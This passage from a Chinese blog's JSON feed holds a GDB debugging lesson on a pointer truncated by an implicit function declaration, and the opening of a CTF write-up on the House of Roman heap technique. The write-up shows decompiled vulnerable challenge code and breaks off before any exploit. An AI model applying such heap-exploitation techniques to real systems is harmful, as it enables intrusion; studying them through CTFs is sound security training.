            "id": "https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/",
            "url": "https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/",
            "title": "盛格塾课程-拍案惊奇GDB以战说法1-谁截断了我的指针?",
            "date_published": "2023-10-26T13:54:31.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>​\t之前知道老师是因为《软件调试》这本书，非常厉害，但是因为主要是windows的一直还没读（因为主要学习Linux，不过最近越发感觉不能局限于一个系统），最近看见一个大佬在朋友圈转发这个课，才发现张老师原来是有自己的公司和培训，看了下来太牛了，立马报名了。</p>\n<p>​\t(老师b站也有号, 官网nanocode.cn,) 还有其他很多优秀的课程,看来要好好买一波了..这才是真正有价值的知识付费!!</p>\n<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>​\t老师将实际案例中的一个问题抽象出了一个很简单的demo, 用于搜索argv[0]的名字, 其实也就是当前可执行程序的名字,本身看着这个代码是没有什么问题的(不,有问题,没有include parser.c)</p>\n<p>parser.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// parser.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span> * <span class=\"title function_\">get_name</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* full_path)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> * sep = <span class=\"built_in\">strrchr</span>(full_path, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (sep == <span class=\"literal\">NULL</span>)? <span class=\"string\">&quot;errname&quot;</span>: sep+<span class=\"number\">1</span>;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ptrtrap.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* name = get_name(argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Demo of pointer trap by Raymond.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name: %s\\n&quot;</span>, name);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t在编译的时候会给出一个警告</p>\n<p>gcc -g ptrtrap.c parser.c</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-4-8-ubuntu:/home/ubuntu/youlan# gcc -g ptrtrap.c parser.c</span><br><span class=\"line\">ptrtrap.c: In function ‘main’:</span><br><span class=\"line\">ptrtrap.c:5:22: warning: implicit declaration of function ‘get_name’; did you mean ‘rename’? [-Wimplicit-function-declaration]</span><br><span class=\"line\">    5 |         char* name = get_name(argv[0]);</span><br><span class=\"line\">      |                      ^~~~~~~~</span><br><span class=\"line\">      |                      rename</span><br><span class=\"line\">ptrtrap.c:5:22: warning: initialization of ‘char *’ from ‘int’ makes pointer from integer without a cast [-Wint-conversion]</span><br></pre></td></tr></table></figure>\n\n<p>​\t运行的时候会发生段错误</p>\n<p>Program received signal SIGSEGV, Segmentation fault</p>\n<p>段错误，访问了不该访问的</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024145754493.png\" alt=\"image-20231024145754493\"></p>\n<h1 id=\"调试分析\"><a href=\"#调试分析\" class=\"headerlink\" title=\"调试分析\"></a>调试分析</h1><h2 id=\"回溯粗看\"><a href=\"#回溯粗看\" class=\"headerlink\" title=\"回溯粗看\"></a>回溯粗看</h2><p>​\t朱熹的不远复:“不远复”，出自《易经》“不远之复，以修身也”。和孔子的吾日三省吾身有异曲同工之妙,人要不断反思自己,反省走的路.</p>\n<p>​\tbt命令回溯 调用栈 , <strong>库函数一般都经过很多修改和测试、一般没问题，所以更多的还是自己写的代码的问题</strong></p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150010518.png\" alt=\"image-20231024150010518\"></p>\n<p>​\t可以减少bt的显示，如 bt -frame-info short-location 不带源代码位置</p>\n<p>​\tframe 3查看自己写的函数里的栈帧的情况, list查看源代码， 这样就能够看到上下文， disass查看汇编</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150656532.png\" alt=\"image-20231024150656532\"></p>\n<p>​\t所以能够看到问题是在 call  printf这里，产生了问题, <strong>也就是传入的name有问题</strong></p>\n<p>​\t问: __printf为什么带下划线？</p>\n<p>​\t答: 因为__printf是libc实现的，   _ _通常是编译器的函数 编译器的优化？</p>\n<p>​\tinfo shared查看进程里的库, ld负责把程序从外存搬运到内存, libc负责实现标准库函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; info shared</span><br><span class=\"line\">From                To                  Syms Read   Shared Object Library</span><br><span class=\"line\">0x00007ffff7fc5090  0x00007ffff7fee315  Yes         /lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">0x00007ffff7daf700  0x00007ffff7f41b3d  Yes         /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"函数从哪里开始执行？\"><a href=\"#函数从哪里开始执行？\" class=\"headerlink\" title=\"函数从哪里开始执行？\"></a>函数从哪里开始执行？</h4><p>​\telf从哪里开始呢，不是main 是_start(), bt有个选项 -past-main查看main函数之前的,有的默认开启了</p>\n<p>__libc_start_call_main 用来做准备工作？</p>\n<h2 id=\"细看崩溃指令\"><a href=\"#细看崩溃指令\" class=\"headerlink\" title=\"细看崩溃指令\"></a>细看崩溃指令</h2><p>​\t来到崩溃的那一行汇编来看看什么情况,这里指向的含义是 尝试执行这条指令，但是失败了</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024151819672.png\" alt=\"image-20231024151819672\"></p>\n<p>vpcmpeqb指令</p>\n<p>​\t[rdi]是引用内存, 此时的rdi的值是0xffffffffffffe7db,我们来看一下内存的情况,用info inferiors命令,查看进程,然后从proc里看内存(pwndbg可以直接vmmap)</p>\n<p>​\t从这里看地址就能看出来，是无效地址, 用户空间的大小早超了(所以说每个细节都需要关注)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">info inferiors</span></span><br><span class=\"line\">  Num  Description       Connection           Executable</span><br><span class=\"line\">* 1    process 1269337   1 (native)           /home/ubuntu/youlan/a.out</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">!<span class=\"built_in\">cat</span> /proc/1269337/maps</span></span><br><span class=\"line\">555555554000-555555555000 r--p 00000000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555555000-555555556000 r-xp 00001000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555556000-555555557000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555557000-555555558000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555558000-555555559000 rw-p 00003000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]</span><br><span class=\"line\">7ffff7d84000-7ffff7d87000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7d87000-7ffff7daf000 r--p 00000000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7daf000-7ffff7f44000 r-xp 00028000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7f44000-7ffff7f9c000 r--p 001bd000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7f9c000-7ffff7fa0000 r--p 00214000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7fa0000-7ffff7fa2000 rw-p 00218000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7fa2000-7ffff7faf000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]</span><br><span class=\"line\">7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class=\"line\">7ffff7fc3000-7ffff7fc5000 r--p 00000000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7fc5000-7ffff7fef000 r-xp 00002000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7fef000-7ffff7ffa000 r--p 0002c000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7ffb000-7ffff7ffd000 r--p 00037000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7ffd000-7ffff7fff000 rw-p 00039000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class=\"line\">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"何人传来无效指针\"><a href=\"#何人传来无效指针\" class=\"headerlink\" title=\"何人传来无效指针?\"></a>何人传来无效指针?</h2><p>​\t库函数出问题概率很低，所以找自己写的函数.  我们知道问题出在name变量上</p>\n<p>​\tframe 3 、然后用 p name 、info locals 都能看到是无效的</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-16-56.jpg\" alt=\"Snipaste_2023-10-26_17-16-56\"></p>\n<p>​\tinfo frame 看函数的栈帧信息</p>\n<p>​\t既然是name错了 它哪里来的？ <strong>get_name</strong>，</p>\n<h3 id=\"get-name调试\"><a href=\"#get-name调试\" class=\"headerlink\" title=\"get_name调试\"></a>get_name调试</h3><p>​\t设置get_name的断点进行调试</p>\n<p>​\t返回值看rax（通常通用寄存器第一个存返回值），<strong>rax在返回的时候是没问题的，那哪里出问题了。。此时事情就很奇怪了</strong></p>\n<img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-38-09.jpg\" alt=\"Snipaste_2023-10-26_17-38-09\" style=\"zoom:50%;\">\n\n\n\n<p>返回后执行ni, 单步一下,再看值,就错了</p>\n<img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-35-28.jpg\" alt=\"Snipaste_2023-10-26_17-35-28\" style=\"zoom:50%;\">\n\n\n\n<h2 id=\"答案揭晓\"><a href=\"#答案揭晓\" class=\"headerlink\" title=\"答案揭晓\"></a>答案揭晓</h2><p>​\t问题就出在这一条指令上,它改变了值的大小</p>\n<p>​\tcdqe: 扩展指令,使用eax的最高位拓展rax高32位的所有位</p>\n<p>​\tx86下和arm不太一样, sxtw这条指令有问题（arm下</p>\n<p>​\t<font color=\"red\">这是编译器故意产生的指令,和没有include这个函数有关系</font>,再深入的..就先放放</p>\n<h1 id=\"问题与知识补充\"><a href=\"#问题与知识补充\" class=\"headerlink\" title=\"问题与知识补充\"></a>问题与知识补充</h1><ol>\n<li>include进来就没问题了</li>\n</ol>\n<p> #include “parser.c”</p>\n<p>但是有个新的warning</p>\n<p>32位下编译没问题</p>\n<p>为什么会有一个nop指令</p>\n<p>nop插桩</p>\n<h3 id=\"如何跑arm系统\"><a href=\"#如何跑arm系统\" class=\"headerlink\" title=\"如何跑arm系统\"></a>如何跑arm系统</h3><p>macbook直接可以</p>\n<p>x86怎么装？：看样子基本上离不开qemu</p>\n<p>云服务器买</p>\n<p><a href=\"https://blog.csdn.net/chenxiangneu/article/details/78955462\">https://blog.csdn.net/chenxiangneu/article/details/78955462</a></p>\n<p>设置符号服务器？</p>\n<h3 id=\"失败了如何再执行？\"><a href=\"#失败了如何再执行？\" class=\"headerlink\" title=\"失败了如何再执行？\"></a>失败了如何再执行？</h3><p>info signal</p>\n<p>info handle</p>\n<p>handle SIGSEGV nopass （不给应用程序</p>\n<p>再跑一遍又会收到这个信号</p>\n<p>smd指令。。。</p>\n<p>用户空间 内核空间大小</p>\n",
            "tags": [
                "调试"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/",
            "title": "pwn入门-44-houseofroman",
            "date_published": "2023-10-25T08:58:22.000Z",
            "content_html": "<p>​\t在一次比赛中遇到了堆题,没有show函数,懵逼了…当时有略过一丝思路通过io stdout输出,但奈何这方面知识了解还不多(不过确实可以通过搜索引擎 搜索关键字来找到这种手法)</p>\n<p>​\t(后来发现这是n年前的手法了😭, </p>\n<h1 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h1><p>npuctf_2020_bad_guy</p>\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>经典菜单堆,但是没有show</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> num; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  prog_init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;=== Bad Guy ===&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Malloc&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Edit&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. Free&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt;&gt; &quot;</span>);</span><br><span class=\"line\">      num = read_num();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      edit();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( num &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        delete();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( num == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2333, Bad Guy!&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      add();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"结构体\"><a href=\"#结构体\" class=\"headerlink\" title=\"结构体\"></a>结构体</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;</span><br><span class=\"line\">    <span class=\"type\">char</span> *content;</span><br><span class=\"line\">&#125; heaparray;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  size = read_num();</span><br><span class=\"line\">  *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">0xA</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num) = size;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content:&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>heaparray是存放分配堆块的指针的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tele <span class=\"number\">0x555555602040</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x555555602040</span> (heaparray) ◂— <span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│  <span class=\"number\">0x555555602048</span> (heaparray+<span class=\"number\">8</span>) —▸ <span class=\"number\">0x555555400ced</span> (add+<span class=\"number\">92</span>) ◂— mov rdx, qword ptr [rbp - <span class=\"number\">0x10</span>]</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│  <span class=\"number\">0x555555602050</span> (heaparray+<span class=\"number\">16</span>) ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h3><p>free过后 也置0了</p>\n<p>如果不置0,那free是干了什么..我记得是..</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _QWORD *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">0xA</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v0 = (_QWORD *)((<span class=\"type\">char</span> *)&amp;heaparray + <span class=\"number\">16</span> * num + <span class=\"number\">8</span>);</span><br><span class=\"line\">    *v0 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"edit\"><a href=\"#edit\" 